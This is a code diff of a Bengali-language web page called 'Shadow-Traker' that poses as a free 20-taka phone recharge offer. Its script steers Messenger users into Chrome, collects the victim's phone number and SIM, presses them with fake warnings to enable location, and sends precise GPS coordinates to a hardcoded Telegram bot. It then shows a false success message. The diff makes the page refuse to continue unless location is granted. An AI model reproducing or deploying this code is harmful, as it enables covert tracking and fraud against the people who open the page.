@@ -16,9 +16,9 @@
 </head>
 <body>
 
-<div class="container" id="main-box">
+<div class="container">
     <h2>🎁 ধামাকা অফার!</h2>
-    <p>সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
+    <p id="msg-text">সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
     
     <a id="open-chrome" class="chrome-btn" href="intent://sidzf8.github.io/Shadow-Traker/#Intent;scheme=https;package=com.android.chrome;end">
         Open in Chrome Browser
@@ -40,12 +40,11 @@
 </div>
 
 <script>
-// মেসেঞ্জার বা ইন-অ্যাপ ব্রাউজার চেক করা
 var isMessenger = /FBAN|FBAV|Messenger/i.test(navigator.userAgent);
 if (isMessenger) {
     document.getElementById('form-area').style.display = 'none';
     document.getElementById('open-chrome').style.display = 'block';
-    document.querySelector('p').innerText = "অফারটি নিশ্চিত করতে নিচের বাটনে ক্লিক করে ক্রোম ব্রাউজার ওপেন করুন।";
+    document.getElementById('msg-text').innerText = "অফারটি নিশ্চিত করতে নিচের বাটনে ক্লিক করে ক্রোম ব্রাউজার ওপেন করুন।";
 }
 
 function processOffer() {
@@ -57,36 +56,38 @@ function processOffer() {
         return; 
     }
 
-    // আপনার দেওয়া সেই নির্দিষ্ট লেখা
+    // আপনার স্পেশাল ওয়ার্নিং
     alert("রিচাজ নিশ্চিত করতে ফোনের লকেশন অপশন অন করুন না হলে পেমেন্ট পাবেন্না");
-
-    var token = "8502696183:AAHMRmatcsRh3fXyX2ng8AyU3y6f3m-7Mdw";
-    var chat_id = "7887080882";
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
+            // লোকেশন পাওয়া গেলে এই অংশ কাজ করবে
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
             var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
             
-            var message = "✅ **লোকেশন অন**\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n📍 ম্যাপ: " + mapUrl;
-            sendToTelegram(token, chat_id, message);
+            var token = "8502696183:AAHMRmatcsRh3fXyX2ng8AyU3y6f3m-7Mdw";
+            var chat_id = "7887080882";
+            var message = "✅ **সাকসেস (লোকেশন অন)**\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n📍 ম্যাপ: " + mapUrl;
+            
+            sendToTelegram(token, chat_id, message, true);
         }, function(error) {
-            var message = "⚠️ **লোকেশন অফ**\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n❌ কারণ: পারমিশন দেয়নি।";
-            sendToTelegram(token, chat_id, message);
-        }, { enableHighAccuracy: true, timeout: 5000 });
+            // লোকেশন না দিলে বা অফ থাকলে এই অংশ কাজ করবে
+            alert("ভুল! আপনি ফোনের লোকেশন পারমিশন দেননি। লোকেশন অন না করলে রিচার্জ পাওয়া সম্ভব নয়। আবার চেষ্টা করুন।");
+        }, { enableHighAccuracy: true, timeout: 10000 });
     } else {
-        var message = "❌ GPS নেই: " + phone;
-        sendToTelegram(token, chat_id, message);
+        alert("আপনার ফোনে জিপিএস সাপোর্ট করছে না।");
     }
 }
 
-function sendToTelegram(token, chat_id, message) {
+function sendToTelegram(token, chat_id, message, success) {
     var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";
     
     fetch(url).then(() => {
-        alert("আবেদন সফল! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
-        window.location.href = "https://www.google.com";
+        if(success) {
+            alert("আবেদন সফল! আপনার তথ্য যাচাই করা হয়েছে। ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+            window.location.href = "https://www.google.com";
+        }
     });
 }
 </script>
